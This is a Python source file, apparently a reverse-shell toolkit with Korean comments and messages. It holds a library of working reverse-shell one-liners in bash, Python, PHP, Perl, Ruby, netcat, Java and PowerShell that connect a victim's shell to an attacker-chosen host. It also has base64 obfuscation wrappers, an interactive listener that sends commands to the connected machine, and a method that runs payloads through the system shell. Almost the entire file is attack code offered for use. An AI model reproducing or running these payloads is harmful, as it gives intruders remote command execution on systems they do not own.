import socket
import subprocess
import base64
import random
import string
from typing import Optional, Dict, List
import threading
import time
import os
import sys
from colorama import init, Fore, Style

# Initialize colorama
init()

class ReverseShell:
    def __init__(self):
        self.payloads = {
            'python': [
                'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
                'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''
            ],
            'bash': [
                'bash -i >& /dev/tcp/{host}/{port} 0>&1',
                '0<&196;exec 196<>/dev/tcp/{host}/{port}; sh <&196 >&196 2>&196',
                '/bin/bash -l > /dev/tcp/{host}/{port} 0<&1 2>&1'
            ],
            'php': [
                'php -r \'$sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\'',
                'php -r \'$s=fsockopen("{host}",{port});$proc=proc_open("/bin/sh -i", array(0=>$s, 1=>$s, 2=>$s),$pipes);\''
            ],
            'perl': [
                'perl -e \'use Socket;$i="{host}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'',
                'perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{host}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\''
            ],
            'ruby': [
                'ruby -rsocket -e\'f=TCPSocket.open("{host}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
                'ruby -rsocket -e\'exit if fork;c=TCPSocket.new("{host}","{port}");while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end\''
            ],
            'netcat': [
                'nc -e /bin/sh {host} {port}',
                'nc -c /bin/sh {host} {port}',
                'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f'
            ],
            'java': [
                'r = Runtime.getRuntime();p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{host}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[]);p.waitFor();'
            ],
            'powershell': [
                '$client = New-Object System.Net.Sockets.TCPClient("{host}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'
            ]
        }
        
        self.encoded_payloads = {
            'base64': {
                'python': 'python -c \'import base64;exec(base64.b64decode("{encoded_payload}"))\'',
                'bash': 'echo "{encoded_payload}" | base64 -d | bash',
                'powershell': 'powershell -EncodedCommand "{encoded_payload}"'
            }
        }

    def generate_payload(self, shell_type: str, host: str, port: int) -> str:
        """지정된 타입의 리버스 쉘 페이로드를 생성합니다."""
        if shell_type not in self.payloads:
            raise ValueError(f"지원하지 않는 쉘 타입: {shell_type}")
        
        payload = random.choice(self.payloads[shell_type])
        return payload.format(host=host, port=port)

    def generate_encoded_payload(self, shell_type: str, host: str, port: int, encoding_type: str = 'base64') -> str:
        """인코딩된 리버스 쉘 페이로드를 생성합니다."""
        if encoding_type not in self.encoded_payloads:
            raise ValueError(f"지원하지 않는 인코딩 타입: {encoding_type}")
        
        if shell_type not in self.encoded_payloads[encoding_type]:
            raise ValueError(f"지원하지 않는 쉘 타입: {shell_type}")
        
        payload = self.generate_payload(shell_type, host, port)
        encoded_payload = base64.b64encode(payload.encode()).decode()
        return self.encoded_payloads[encoding_type][shell_type].format(encoded_payload=encoded_payload)

    def start_listener(self, port: int) -> None:
        """리버스 쉘 리스너를 시작합니다."""
        try:
            # 소켓 생성
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            # 바인딩
            s.bind(('0.0.0.0', port))
            s.listen(1)
            
            print(f"{Fore.GREEN}[*] 리버스 쉘 리스너가 시작되었습니다. 포트: {port}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] 연결을 기다리는 중...{Style.RESET_ALL}")
            
            # 연결 대기
            conn, addr = s.accept()
            print(f"{Fore.GREEN}[+] 연결 성공: {addr[0]}:{addr[1]}{Style.RESET_ALL}")
            
            # 쉘 세션 시작
            while True:
                try:
                    # 명령어 입력
                    command = input(f"{Fore.CYAN}shell> {Style.RESET_ALL}")
                    
                    if command.lower() in ['exit', 'quit']:
                        conn.send(b'exit\n')
                        break
                    
                    # 명령어 전송
                    conn.send(command.encode() + b'\n')
                    
                    # 응답 수신
                    response = conn.recv(4096).decode()
                    print(response)
                    
                except KeyboardInterrupt:
                    print(f"\n{Fore.YELLOW}[*] 세션 종료 중...{Style.RESET_ALL}")
                    conn.send(b'exit\n')
                    break
                    
        except Exception as e:
            print(f"{Fore.RED}[!] 오류 발생: {str(e)}{Style.RESET_ALL}")
            
        finally:
            try:
                conn.close()
                s.close()
            except:
                pass
            print(f"{Fore.YELLOW}[*] 리스너가 종료되었습니다.{Style.RESET_ALL}")

    def execute_payload(self, payload: str) -> None:
        """생성된 페이로드를 실행합니다."""
        try:
            subprocess.Popen(payload, shell=True)
            print(f"{Fore.GREEN}[+] 페이로드가 실행되었습니다.{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[!] 페이로드 실행 중 오류 발생: {str(e)}{Style.RESET_ALL}")

    def generate_all_payloads(self, host: str, port: int) -> Dict[str, List[str]]:
        """모든 유형의 리버스 쉘 페이로드를 생성합니다."""
        all_payloads = {}
        for shell_type in self.payloads:
            all_payloads[shell_type] = [
                self.generate_payload(shell_type, host, port)
                for _ in range(2)  # 각 타입별로 2개씩 생성
            ]
        return all_payloads

    def print_available_shells(self) -> None:
        """사용 가능한 쉘 타입을 출력합니다."""
        print(f"{Fore.CYAN}사용 가능한 쉘 타입:{Style.RESET_ALL}")
        for shell_type in self.payloads:
            print(f"  - {shell_type}")
        print()

    def print_available_encodings(self) -> None:
        """사용 가능한 인코딩 타입을 출력합니다."""
        print(f"{Fore.CYAN}사용 가능한 인코딩 타입:{Style.RESET_ALL}")
        for encoding_type in self.encoded_payloads:
            print(f"  - {encoding_type}")
        print() 